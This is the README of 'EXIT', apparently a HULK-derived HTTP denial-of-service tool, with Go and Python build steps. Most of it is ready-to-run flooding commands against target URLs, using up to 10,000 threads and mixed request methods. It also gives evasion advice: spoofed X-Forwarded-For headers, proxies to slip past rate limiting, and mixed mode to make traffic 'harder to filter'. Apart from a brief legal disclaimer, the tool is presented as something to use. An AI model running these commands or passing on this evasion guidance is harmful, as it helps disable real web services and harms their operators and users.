# EXIT - HTTP Unbearable Load King (Enhanced v2.0)

**⚠️ WARNING: This tool is for authorized security testing and research purposes only. Unauthorized use is illegal and prohibited.**

## Overview

EXIT is a powerful HTTP load testing tool designed to stress test web servers by exhausting their resource pools. This enhanced version includes significant improvements in performance, attack vectors, and features.

## Installation

### Prerequisites

#### For Go Version:
- **Go 1.16 or higher** installed on your system
- Check if Go is installed: `go version`
- If not installed, download from: https://golang.org/dl/

#### For Python Version:
- **Python 3.6 or higher** installed on your system
- Check if Python is installed: `python --version` or `python3 --version`
- If not installed, download from: https://www.python.org/downloads/

### Installation Steps

#### Option 1: Go Version (Recommended for Performance)

**Windows:**
```powershell
# Navigate to the project directory
cd Exit-Dos-Tool-main

# Build the executable
go build -o exit.exe exit.go

# Run it
.\exit.exe -site http://example.com
```

**Linux/Mac:**
```bash
# Navigate to the project directory
cd Exit-Dos-Tool-main

# Build the executable
go build -o exit exit.go

# Make it executable (Linux/Mac)
chmod +x exit

# Run it
./exit -site http://example.com
```

#### Option 2: Python Version (Easier to Modify)

**Windows:**
```powershell
# Navigate to the project directory
cd Exit-Dos-Tool-main

# Run directly (Python 3)
python exit.py http://example.com

# Or if you have both Python 2 and 3
python3 exit.py http://example.com
```

**Linux/Mac:**
```bash
# Navigate to the project directory
cd Exit-Dos-Tool-main

# Run directly
python3 exit.py http://example.com

# Or if python3 is aliased to python
python exit.py http://example.com
```

### Quick Start

**Go Version:**
```bash
# Build
go build -o exit exit.go

# Basic usage
./exit -site http://target.com
```

**Python Version:**
```bash
# No build needed, run directly
python3 exit.py http://target.com
```

## What's New in v2.0

### Enhanced Features:
- **Increased Concurrency**: Default max connections increased from 1023 to 8192 (Go) and threads from 500 to 2000 (Python)
- **Multiple Attack Modes**: GET, POST, HEAD, PUT, DELETE, and MIXED modes
- **Connection Pooling**: Optimized HTTP connection reuse for better performance
- **Proxy Support**: Route traffic through HTTP/HTTPS proxies
- **Modern User Agents**: Updated with latest browser user agent strings
- **Advanced Evasion**: Random headers (X-Forwarded-For, X-Real-IP) for better evasion
- **SSL/TLS Options**: Option to disable SSL certificate verification
- **Configurable Timeouts**: Customizable request timeouts
- **Request Delays**: Optional delays between requests
- **Better Error Handling**: Improved error handling and recovery

## Go Version (exit.go)

### Installation & Build

**Windows:**
```powershell
# Install Go (if not installed)
# Download from: https://golang.org/dl/
# Then run:
go build -o exit.exe exit.go
```

**Linux:**
```bash
# Install Go (if not installed)
sudo apt-get update
sudo apt-get install golang-go

# Or on CentOS/RHEL:
sudo yum install golang

# Build the executable
go build -o exit exit.go
chmod +x exit
```

**macOS:**
```bash
# Install Go using Homebrew (if not installed)
brew install go

# Build the executable
go build -o exit exit.go
chmod +x exit
```

### Usage
```bash
# Windows
exit.exe -site <target_url> [options]

# Linux/Mac
./exit -site <target_url> [options]
```

### Options
- `-site <url>`: Target URL (required)
- `-safe`: Auto-shutdown after detecting 500 errors
- `-mode <mode>`: Attack mode - `get`, `post`, `head`, `put`, `delete`, `mixed` (default: `get`)
- `-proxy <url>`: Proxy URL (e.g., `http://127.0.0.1:8080`)
- `-timeout <seconds>`: Request timeout (default: 30)
- `-keepalive`: Use HTTP keep-alive (default: true)
- `-insecure`: Disable SSL certificate verification
- `-delay <ms>`: Delay between requests in milliseconds (default: 0)
- `-agents <file>`: Custom user-agent file
- `-header <header>`: Add custom header (can be used multiple times)
- `-data <data>`: POST data (switches to POST mode if provided)
- `-version`: Show version

### Environment Variables
- `EXITMAXPROCS`: Maximum concurrent connections (default: 8192)

### Examples

**Windows:**
```powershell
# Basic GET attack
exit.exe -site http://example.com

# POST attack with custom data
exit.exe -site http://example.com -mode post -data "key=value"

# Mixed attack modes through proxy
exit.exe -site https://example.com -mode mixed -proxy http://127.0.0.1:8080

# Attack with custom timeout and delay
exit.exe -site http://example.com -timeout 60 -delay 10

# Safe mode (auto-stop on 500 errors)
exit.exe -site http://example.com -safe

# High performance attack with custom max connections
$env:EXITMAXPROCS="10000"
exit.exe -site http://example.com
```

**Linux/Mac:**
```bash
# Basic GET attack
./exit -site http://example.com

# POST attack with custom data
./exit -site http://example.com -mode post -data "key=value"

# Mixed attack modes through proxy
./exit -site https://example.com -mode mixed -proxy http://127.0.0.1:8080

# Attack with custom timeout and delay
./exit -site http://example.com -timeout 60 -delay 10

# Safe mode (auto-stop on 500 errors)
./exit -site http://example.com -safe

# High performance attack with custom max connections
EXITMAXPROCS=10000 ./exit -site http://example.com
```

## Python Version (exit.py)

### Installation & Requirements

**Windows:**
```powershell
# Check Python version
python --version
# Should be Python 3.6 or higher

# If not installed, download from: https://www.python.org/downloads/
# No additional packages needed - uses standard library only
```

**Linux:**
```bash
# Install Python 3 (if not installed)
sudo apt-get update
sudo apt-get install python3

# Or on CentOS/RHEL:
sudo yum install python3

# Check version
python3 --version
```

**macOS:**
```bash
# Python 3 usually comes pre-installed
python3 --version

# If not, install using Homebrew:
brew install python3
```

### Usage
```bash
# Windows
python exit.py <target_url> [options]

# Linux/Mac
python3 exit.py <target_url> [options]
```

### Options
- `url`: Target URL (required)
- `--safe`: Auto-shutdown after detecting 500 errors
- `--mode <mode>`: Attack mode - `get`, `post`, `head`, `put`, `delete`, `mixed` (default: `get`)
- `--threads <num>`: Number of threads (default: 2000)
- `--timeout <seconds>`: Request timeout (default: 30)
- `--delay <ms>`: Delay between requests in milliseconds (default: 0)
- `--proxy <url>`: Proxy URL (e.g., `http://127.0.0.1:8080`)
- `--insecure`: Disable SSL certificate verification

### Examples

**Windows:**
```powershell
# Basic GET attack
python exit.py http://example.com

# POST attack with 5000 threads
python exit.py http://example.com --mode post --threads 5000

# Mixed attack modes
python exit.py https://example.com --mode mixed --insecure

# Attack with proxy and custom settings
python exit.py http://example.com --proxy http://127.0.0.1:8080 --timeout 60 --delay 5

# Safe mode
python exit.py http://example.com --safe

# High thread count attack
python exit.py http://example.com --threads 10000 --mode mixed
```

**Linux/Mac:**
```bash
# Basic GET attack
python3 exit.py http://example.com

# POST attack with 5000 threads
python3 exit.py http://example.com --mode post --threads 5000

# Mixed attack modes
python3 exit.py https://example.com --mode mixed --insecure

# Attack with proxy and custom settings
python3 exit.py http://example.com --proxy http://127.0.0.1:8080 --timeout 60 --delay 5

# Safe mode
python3 exit.py http://example.com --safe

# High thread count attack
python3 exit.py http://example.com --threads 10000 --mode mixed
```

## Attack Modes

1. **GET**: Standard GET requests (default)
2. **POST**: POST requests with random form data
3. **HEAD**: HEAD requests (lighter, faster)
4. **PUT**: PUT requests with random data
5. **DELETE**: DELETE requests
6. **MIXED**: Randomly alternates between all methods

## Complete Command Reference

### Go Version Commands

**Basic Commands:**
```bash
# Show version
./exit -version

# Basic attack
./exit -site http://target.com

# With all options
./exit -site http://target.com -mode mixed -timeout 60 -delay 5 -proxy http://proxy:8080 -insecure -safe
```

**Advanced Usage:**
```bash
# Custom user agents file
./exit -site http://target.com -agents useragents.txt

# Custom headers
./exit -site http://target.com -header "X-Custom: value" -header "Authorization: Bearer token"

# POST with data
./exit -site http://target.com -mode post -data "username=test&password=test"
```

### Python Version Commands

**Basic Commands:**
```bash
# Show help
python3 exit.py --help

# Basic attack
python3 exit.py http://target.com

# With all options
python3 exit.py http://target.com --mode mixed --threads 5000 --timeout 60 --delay 5 --proxy http://proxy:8080 --insecure --safe
```

**Advanced Usage:**
```bash
# High performance attack
python3 exit.py http://target.com --threads 10000 --mode get

# Slow attack (with delay)
python3 exit.py http://target.com --delay 100 --threads 1000

# HTTPS with insecure SSL
python3 exit.py https://target.com --insecure --mode mixed
```

## Performance Tips

1. **Go Version**: Generally faster and more efficient. Recommended for maximum performance.
2. **Python Version**: Easier to modify and extend. Good for testing and development.
3. **Connection Limits**: Adjust `EXITMAXPROCS` (Go) or `--threads` (Python) based on your system resources.
4. **Proxy Usage**: Using proxies can help distribute load and avoid rate limiting.
5. **Mixed Mode**: Use mixed mode to make attacks less predictable and harder to filter.
6. **System Limits**: On Linux, you may need to increase file descriptor limits:
   ```bash
   ulimit -n 65535
   ```
7. **Windows**: For best performance on Windows, use the Go version.

## Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only. The authors and contributors are not responsible for any misuse or damage caused by this tool. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

## License

See LICENSE file for details.

## Credits

- Original author: Barry Shteiman
- Enhanced version: v2.0
